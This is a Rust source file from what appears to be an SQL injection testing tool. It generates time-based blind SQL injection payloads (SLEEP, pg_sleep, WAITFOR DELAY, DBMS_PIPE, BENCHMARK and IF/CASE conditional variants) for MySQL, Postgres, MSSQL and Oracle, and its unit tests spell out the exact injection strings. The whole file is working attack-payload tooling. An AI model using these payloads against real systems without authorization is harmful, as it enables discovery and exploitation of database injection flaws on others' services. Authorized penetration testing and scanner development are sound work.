#![deny(unsafe_code)]

use crate::dbms::{mssql::payloads as mssql_p, mysql::payloads as mysql_p};

#[derive(Debug, Clone)]
#[non_exhaustive]
pub struct TimePayload {
    pub payload: String,
    pub sleep_secs: u64,
    pub dbms: Option<String>,
}

impl TimePayload {
    #[must_use]
    pub fn new(payload: impl Into<String>, sleep_secs: u64, dbms: Option<String>) -> Self {
        Self {
            payload: payload.into(),
            sleep_secs,
            dbms,
        }
    }
}

/// Legacy single-payload entry point (kept for compat).
/// Index `0` of [`time_payloads_for`] — same string, same `sleep_secs`.
/// MSSQL formatting delegates to [`mssql_p::waitfor_delay_literal`]
/// (single source of truth, fixes the `'00:00:0{secs}'` >=10s bug).
///
/// # Panics
/// Panics if `secs < 1`.
#[must_use]
pub fn time_payload_for(dbms: Option<&str>, secs: u64) -> TimePayload {
    assert!(secs >= 1, "sleep_secs must be >= 1");
    let first = time_payloads_for(dbms, secs);
    // `time_payloads_for` always returns >= 1 element (legacy first).
    first.into_iter().next().unwrap_or_else(|| {
        // Defensive: unreachable unless the payload table is emptied.
        TimePayload::new(format!("' AND SLEEP({secs}) -- -"), secs, None)
    })
}

/// Full per-DBMS payload set: legacy payload first (compat), then
/// conditional/alternate variants.
///
/// - MySQL: `SLEEP` (legacy), `IF(1=1,SLEEP,0)` conditional, `BENCHMARK` fallback.
/// - Postgres: `pg_sleep` (legacy), `CASE WHEN ... THEN pg_sleep` conditional.
/// - MSSQL: `WAITFOR DELAY` (legacy, via shared `waitfor_delay_literal`),
///   `IF(1=1) WAITFOR` conditional.
/// - Oracle: `DBMS_PIPE.RECEIVE_MESSAGE` (legacy), `DBMS_LOCK.SLEEP` alternate.
/// - Generic/`None`: `SLEEP` (legacy) + `IF` conditional.
///
/// # Panics
/// Panics if `secs < 1`.
#[must_use]
pub fn time_payloads_for(dbms: Option<&str>, secs: u64) -> Vec<TimePayload> {
    assert!(secs >= 1, "sleep_secs must be >= 1");
    let tag = dbms.map(str::to_owned);
    match dbms {
        Some("mysql") => vec![
            TimePayload::new(mysql_p::mysql_time_payload(secs), secs, tag.clone()),
            TimePayload::new(mysql_p::mysql_time_conditional(secs), secs, tag.clone()),
            TimePayload::new(mysql_p::mysql_time_benchmark(), secs, tag.clone()),
        ],
        Some("postgres") => vec![
            TimePayload::new(
                crate::dbms::postgres::payloads::pg_time(secs),
                secs,
                tag.clone(),
            ),
            TimePayload::new(
                crate::dbms::postgres::payloads::pg_time_conditional(secs),
                secs,
                tag.clone(),
            ),
        ],
        Some("mssql") => vec![
            TimePayload::new(mssql_p::mssql_time(secs), secs, tag.clone()),
            TimePayload::new(mssql_p::mssql_time_conditional(secs), secs, tag.clone()),
        ],
        Some("oracle") => vec![
            TimePayload::new(
                crate::dbms::oracle::payloads::oracle_time(secs),
                secs,
                tag.clone(),
            ),
            TimePayload::new(
                crate::dbms::oracle::payloads::oracle_time_lock(secs),
                secs,
                tag.clone(),
            ),
        ],
        _ => vec![
            TimePayload::new(format!("' AND SLEEP({secs}) -- -"), secs, tag.clone()),
            TimePayload::new(format!("' AND IF(1=1,SLEEP({secs}),0) -- -"), secs, tag),
        ],
    }
}

/// Every DBMS-specific time payload (legacy + variants) for blind sweeps
/// when the backend is unknown. Ordering is stable: all four legacy
/// payloads first (mysql, postgres, mssql, oracle), then conditional/
/// alternate variants — so `--level` budgets degrade gracefully to legacy
/// coverage (L1 = 4 legacies, L2 = legacies + variants).
///
/// # Panics
/// Panics if `secs < 1`.
#[must_use]
pub fn all_time_payloads(secs: u64) -> Vec<TimePayload> {
    assert!(secs >= 1, "sleep_secs must be >= 1");
    let mut legacies = Vec::with_capacity(4);
    let mut variants = Vec::with_capacity(5);
    for dbms in ["mysql", "postgres", "mssql", "oracle"] {
        let mut v = time_payloads_for(Some(dbms), secs);
        if !v.is_empty() {
            legacies.push(v.remove(0));
            variants.extend(v);
        }
    }
    legacies.into_iter().chain(variants).collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn legacy_compat_first_per_dbms() {
        // Legacy strings byte-identical to the pre-enrichment behaviour.
        assert_eq!(
            time_payload_for(Some("mysql"), 5).payload,
            "' AND SLEEP(5) -- -"
        );
        assert_eq!(
            time_payload_for(Some("postgres"), 5).payload,
            "'; SELECT pg_sleep(5) --"
        );
        assert_eq!(
            time_payload_for(Some("mssql"), 5).payload,
            "'; WAITFOR DELAY '00:00:05' --"
        );
        assert_eq!(
            time_payload_for(Some("oracle"), 5).payload,
            "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5) --"
        );
        assert_eq!(time_payload_for(None, 5).payload, "' AND SLEEP(5) -- -");
    }

    #[test]
    fn legacy_matches_first_of_variants() {
        for dbms in [
            Some("mysql"),
            Some("postgres"),
            Some("mssql"),
            Some("oracle"),
            None,
        ] {
            let legacy = time_payload_for(dbms, 5);
            let all = time_payloads_for(dbms, 5);
            assert!(!all.is_empty());
            assert_eq!(legacy.payload, all[0].payload);
            assert_eq!(legacy.sleep_secs, all[0].sleep_secs);
        }
    }

    #[test]
    fn mssql_padded_beyond_10s() {
        // Regression: old `'00:00:0{secs}'` broke at >= 10s.
        assert_eq!(
            time_payload_for(Some("mssql"), 10).payload,
            "'; WAITFOR DELAY '00:00:10' --"
        );
        assert_eq!(
            time_payload_for(Some("mssql"), 65).payload,
            "'; WAITFOR DELAY '00:01:05' --"
        );
        assert_eq!(
            time_payload_for(Some("mssql"), 3661).payload,
            "'; WAITFOR DELAY '01:01:01' --"
        );
    }

    #[test]
    fn mssql_delegates_to_shared_literal() {
        let via_technique = time_payload_for(Some("mssql"), 12).payload;
        let via_dbms = mssql_p::mssql_time(12);
        assert_eq!(via_technique, via_dbms);
    }

    #[test]
    fn mysql_has_if_and_benchmark_variants() {
        let v = time_payloads_for(Some("mysql"), 5);
        assert_eq!(v.len(), 3);
        assert!(
            v[1].payload.contains("IF(1=1,SLEEP(5),0)"),
            "{}",
            v[1].payload
        );
        assert!(
            v[2].payload.contains("BENCHMARK(5000000,MD5(1))"),
            "{}",
            v[2].payload
        );
    }

    #[test]
    fn postgres_has_case_variant() {
        let v = time_payloads_for(Some("postgres"), 5);
        assert_eq!(v.len(), 2);
        assert!(v[1].payload.contains("CASE WHEN"), "{}", v[1].payload);
        assert!(v[1].payload.contains("pg_sleep(5)"), "{}", v[1].payload);
    }

    #[test]
    fn oracle_has_lock_variant() {
        let v = time_payloads_for(Some("oracle"), 5);
        assert_eq!(v.len(), 2);
        assert!(
            v[1].payload.contains("DBMS_LOCK.SLEEP(5)"),
            "{}",
            v[1].payload
        );
    }

    #[test]
    fn mssql_has_conditional_variant() {
        let v = time_payloads_for(Some("mssql"), 5);
        assert_eq!(v.len(), 2);
        assert!(v[1].payload.contains("IF(1=1)"), "{}", v[1].payload);
        assert!(v[1].payload.contains("00:00:05"), "{}", v[1].payload);
    }

    #[test]
    fn all_payloads_start_with_legacies() {
        let all = all_time_payloads(5);
        assert_eq!(all.len(), 9);
        assert_eq!(all[0].payload, "' AND SLEEP(5) -- -");
        assert!(all[1].payload.contains("pg_sleep(5)"));
        assert!(all[2].payload.contains("WAITFOR DELAY"));
        assert!(all[3].payload.contains("DBMS_PIPE"));
        // Variants come after the four legacies.
        assert!(all[4..].iter().any(|p| p.payload.contains("BENCHMARK")));
    }
}
